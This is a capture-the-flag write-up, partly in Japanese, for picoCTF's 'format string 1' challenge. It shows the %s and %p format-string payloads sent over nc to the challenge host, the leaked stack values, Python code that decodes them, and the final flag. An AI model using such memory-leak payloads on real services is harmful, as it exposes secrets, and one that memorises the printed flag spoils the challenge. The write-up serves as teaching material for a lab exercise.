# format string 1:Binary Exploitation:100pts
Patrick and Sponge Bob were really happy with those orders you made for them, but now they're curious about the secret menu. Find it, and along the way, maybe you'll find something else of interest!  
Download the binary [here](format-string-1).  
Download the source [here](format-string-1.c).  
Connect with the challenge instance here:  
`nc mimas.picoctf.net 59379`  

Hints  
1  
https://lettieri.iet.unipi.it/hacking/format-strings.pdf  
2  
Is this a 32-bit or 64-bit binary?  

# Solution
バイナリ、ソースと接続先が渡される。  
試しに接続すると、エコーバックしてくれるプログラムでfsbがある。  
```bash
$ nc mimas.picoctf.net 59379
Give me your order and I'll read it back to you:
satoki
Here's your order: satoki
Bye!

$ nc mimas.picoctf.net 59379
Give me your order and I'll read it back to you:
%s%s%s%s%s
Here's your order: Here's your order: (null)(null)%s%s%s%s%s

Bye!
```
`%X$s`でスタックのX番目の文字列へアクセスできるが、近場を探してもフラグは見つからない。  
おそらく文字列へのポインタではなく、文字列がそのままスタックに乗っていると考え`%p`を用いる。  
```bash
$ nc mimas.picoctf.net 59379
Give me your order and I'll read it back to you:
%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p
Here's your order: 0x402118,(nil),0x7faae7e20a00,(nil),0x17a4880,0xa347834,0x7fff13577fc0,0x7faae7c11e60,0x7faae7e364d0,0x1,0x7fff13578090,(nil),(nil),0x7b4654436f636970,0x355f31346d316e34,0x3478345f33317937,0x31655f673431665f,0x7d383130386531,0x7,0x7faae7e388d8,0x2300000007,0x206e693374307250,0xa336c797453,0x9,0x7faae7e49de9,0x7faae7c1a098,0x7faae7e364d0,(nil),0x7fff135780a0,0x70252c70252c7025
Bye!
```
hexをASCIIにすると以下のようにflagが含まれていた。  
```bash
$ python
~~~
>>> from ptrlib import *
>>> p64(0x7b4654436f636970)
b'picoCTF{'
>>> p64(0x355f31346d316e34)
b'4n1m41_5'
>>> p64(0x3478345f33317937)
b'7y13_4x4'
>>> p64(0x31655f673431665f)
b'_f14g_e1'
>>> p64(0x7d383130386531)
b'1e8018}\x00'
>>> p64(0x7b4654436f636970) + p64(0x355f31346d316e34) + p64(0x3478345f33317937) + p64(0x31655f673431665f) + p64(0x7d383130386531)
b'picoCTF{4n1m41_57y13_4x4_f14g_e11e8018}\x00'
```

## picoCTF{4n1m41_57y13_4x4_f14g_e11e8018}